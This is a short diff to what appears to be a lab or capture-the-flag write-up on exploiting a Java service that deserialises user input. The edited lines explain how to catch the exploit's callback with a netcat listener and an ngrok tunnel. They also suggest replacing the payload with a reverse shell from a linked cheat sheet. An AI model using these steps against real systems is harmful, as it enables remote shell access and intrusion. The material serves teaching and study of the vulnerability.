@@ -4,7 +4,7 @@
 The service deserialises User Input
 
 ## Exploitation
-Reusing the code template available in the slides, we can write the following exploit, replacing <HOST:PORT> by a server listening at the given port (`nc -lvnp <PORT>`).
+Reusing the code template available in the slides, we can write the following exploit, replacing <HOST:PORT> by a server listening at the given port (e.g. open a https tunnel `ngrok http <LOCAL_PORT>` and then listen `nc -lvnp <LOCAL_PORT>`).
 The Python payload could be replaced by a Reverse Shell payload to get a shell on the server. Some examples can be found on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python).
 
 ```java
